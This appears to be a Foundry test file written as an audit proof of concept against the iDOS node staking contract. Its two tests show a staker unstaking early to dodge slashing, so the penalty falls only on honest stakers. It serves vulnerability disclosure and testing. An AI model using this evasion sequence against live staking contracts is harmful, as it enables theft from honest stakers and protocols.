// SPDX-License-Identifier: MIT
pragma solidity ^0.8.27;

import {Test, console} from "forge-std/Test.sol";
import {IDOSToken} from "../src/IDOSToken.sol";
import {IDOSNodeStaking} from "../src/IDOSNodeStaking.sol";

contract AuditPoCBreak is Test {
    IDOSToken idosToken;
    IDOSNodeStaking idosStaking;

    address owner = makeAddr("owner");
    address attacker = makeAddr("attacker");
    address honest = makeAddr("honest");
    address node1 = makeAddr("node1");

    uint256 constant START_TIME = 365 days;
    uint256 constant EPOCH_REWARD = 100;

    function setUp() public {
        vm.prank(owner);
        idosToken = new IDOSToken(owner);
        idosStaking = new IDOSNodeStaking(address(idosToken), owner, uint48(START_TIME), EPOCH_REWARD);
        vm.prank(owner);
        idosToken.transfer(address(idosStaking), 10_000);
        vm.prank(owner);
        idosToken.transfer(attacker, 1_000);
        vm.prank(owner);
        idosToken.transfer(honest, 1_000);
        vm.warp(START_TIME);
        vm.prank(owner);
        idosStaking.allowNode(node1);
    }

    function test_Break_OwnerCannotSlashAfterUnstake() public {
        vm.prank(attacker);
        idosToken.approve(address(idosStaking), 1_000);
        vm.prank(attacker);
        idosStaking.stake(address(0), node1, 1_000);

        vm.prank(attacker);
        idosStaking.unstake(node1, 1_000);

        skip(13 days);

        vm.prank(owner);
        vm.expectRevert(abi.encodeWithSignature("NodeIsUnknown(address)", node1));
        idosStaking.slash(node1);

        vm.prank(owner);
        vm.expectRevert(abi.encodeWithSignature("NoWithdrawableSlashedStakes()"));
        idosStaking.withdrawSlashedStakes();

        (uint256 amt,) = idosStaking.unstakesByUser(attacker, 0);
        assertEq(amt, 1_000, "unstaked amount still fully present and unslashable");

        skip(1 days + 1);
        uint256 before = idosToken.balanceOf(attacker);
        vm.prank(attacker);
        idosStaking.withdrawUnstaked();
        assertEq(idosToken.balanceOf(attacker) - before, 1_000, "attacker recovered everything");
    }

    function test_Break_SlashDoesNotFreezePendingUnstake() public {
        vm.prank(attacker);
        idosToken.approve(address(idosStaking), 1_000);
        vm.prank(attacker);
        idosStaking.stake(address(0), node1, 1_000);
        vm.prank(honest);
        idosToken.approve(address(idosStaking), 1_000);
        vm.prank(honest);
        idosStaking.stake(address(0), node1, 1_000);

        vm.prank(attacker);
        idosStaking.unstake(node1, 1_000);

        vm.prank(owner);
        idosStaking.slash(node1);
        vm.prank(owner);
        idosStaking.withdrawSlashedStakes();
        assertEq(idosStaking.slashedStakeWithdrawn(), 1_000, "only honest staker slashed");

        skip(14 days + 1);
        uint256 before = idosToken.balanceOf(attacker);
        vm.prank(attacker);
        idosStaking.withdrawUnstaked();
        assertEq(idosToken.balanceOf(attacker) - before, 1_000, "attacker still recovers everything post-slash");
    }
}